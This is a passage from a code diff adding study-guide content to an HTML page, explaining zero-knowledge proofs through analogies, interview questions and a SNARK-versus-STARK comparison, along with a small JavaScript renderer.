+{l:"Why ZKPs are hard to implement correctly",b:`<p>ZKP systems require expressing the problem as an arithmetic circuit (a series of addition and multiplication gates). The circuit must capture all the computation whose correctness is being proved. Bugs in the circuit description can create soundness vulnerabilities — a prover can generate valid-looking proofs for false statements. High-profile vulnerability: in 2019, Zcash disclosed a cryptographic flaw that would have allowed unlimited counterfeit coins — discovered and patched before exploitation, but it illustrates the risk.</p>`},
+{l:"Mental model — the practical version",b:`<div class="analogy">ZKP is the cryptographic equivalent of a Sudoku proof. If someone shows you a solved Sudoku puzzle, you've learned the solution. But if they show you all 81 numbers shuffled randomly while maintaining they're all the correct digits — you can verify the puzzle is valid without learning the actual grid positions. In practice, ZKP lets you verify computational statements without seeing the computation's inputs or intermediate state — like watching a chef judge say "this soup is perfectly seasoned" without tasting it yourself, based on some unforgeable proof the chef provides.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Explain zero-knowledge proofs using an analogy. When would you use one?</div><div class="a">Cave analogy. Use cases: authentication without credential exposure (prove you know a password without sending it — immune to server-side breaches), age verification without identity disclosure, zkRollups (prove 10K Ethereum transactions are valid in one cheap proof), private computation. The core value: move from "trust me" to "verify without seeing."</div></div>
+<div class="iq"><div class="q">What is the difference between zk-SNARK and zk-STARK?</div><div class="a">SNARKs: tiny proofs (~200 bytes), fast verification, require a trusted setup ceremony. If the setup is compromised, fake proofs are possible. STARKs: larger proofs (~100KB), slower verification, no trusted setup (uses only hash functions — no secret ceremony needed), post-quantum secure. SNARKs for maximum efficiency (Ethereum zkEVM). STARKs for maximum security and quantum resistance (StarkNet).</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Hash Functions (STARKs use hashing)</span><span class="cp">Digital Signatures (proof of knowledge)</span><span class="cp">Blockchain / Distributed Systems</span><span class="cp">Privacy engineering</span></div>`}
+]},
+];
+
+function show(idx,el){
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  el.classList.add('active');render(idx);
+}
+function render(idx){
+  const t=T[idx];
+  let h=`<span class="topic-tag">${t.tag}</span><div class="topic-title">${t.title}</div><div class="topic-oneliner">${t.oneliner}</div>`;
+  for(const s of t.secs)h+=`<div class="sec"><div class="sec-label">${s.l}</div><div class="body">${s.b}</div></div>`;
+  const c=document.getElementById('content');
+  c.innerHTML=h;c.scrollTop=0;
+}
+render(0);
+</script>
